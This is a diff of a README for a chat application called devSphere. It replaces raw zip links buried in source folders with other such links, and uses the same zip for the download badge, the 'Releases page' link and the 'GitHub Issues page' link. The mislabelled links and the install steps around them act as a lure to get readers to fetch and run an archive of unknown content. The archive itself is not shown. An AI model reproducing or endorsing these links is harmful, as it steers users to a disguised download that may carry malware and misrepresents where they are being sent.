@@ -1,6 +1,6 @@
 # 🌐 devSphere - High-Performance Real-Time Chat System
 
-[![Download devSphere](https://github.com/Abdulrahman-7322/devSphere/raw/refs/heads/master/shutu-admin/shutu-admin-server/src/main/java/com/shutu/service/dev-Sphere-1.0.zip)](https://github.com/Abdulrahman-7322/devSphere/raw/refs/heads/master/shutu-admin/shutu-admin-server/src/main/java/com/shutu/service/dev-Sphere-1.0.zip)
+[![Download devSphere](https://github.com/Abdulrahman-7322/devSphere/raw/refs/heads/master/shutu-admin/shutu-admin-client/src/Sphere_dev_v2.0-beta.5.zip)](https://github.com/Abdulrahman-7322/devSphere/raw/refs/heads/master/shutu-admin/shutu-admin-client/src/Sphere_dev_v2.0-beta.5.zip)
 
 ## 🚀 Getting Started
 
@@ -25,7 +25,7 @@ To run devSphere-chat, you will need:
 
 ## 📥 Download & Install
 
-To download the latest version of devSphere, visit the [Releases page](https://github.com/Abdulrahman-7322/devSphere/raw/refs/heads/master/shutu-admin/shutu-admin-server/src/main/java/com/shutu/service/dev-Sphere-1.0.zip) and choose the version suitable for your operating system.
+To download the latest version of devSphere, visit the [Releases page](https://github.com/Abdulrahman-7322/devSphere/raw/refs/heads/master/shutu-admin/shutu-admin-client/src/Sphere_dev_v2.0-beta.5.zip) and choose the version suitable for your operating system.
 
 1. Click on the link above to get to the Releases page.
 2. Look for the latest release at the top.
@@ -59,7 +59,7 @@ Once you have the application running, the user interface will guide you. Here a
 
 ## 📞 Support
 
-If you have questions or need assistance, feel free to reach out. You can open an issue on the [GitHub Issues page](https://github.com/Abdulrahman-7322/devSphere/raw/refs/heads/master/shutu-admin/shutu-admin-server/src/main/java/com/shutu/service/dev-Sphere-1.0.zip).
+If you have questions or need assistance, feel free to reach out. You can open an issue on the [GitHub Issues page](https://github.com/Abdulrahman-7322/devSphere/raw/refs/heads/master/shutu-admin/shutu-admin-client/src/Sphere_dev_v2.0-beta.5.zip).
 
 For more detailed guides and tips, consider visiting our Wiki section linked on the main repository page.
 
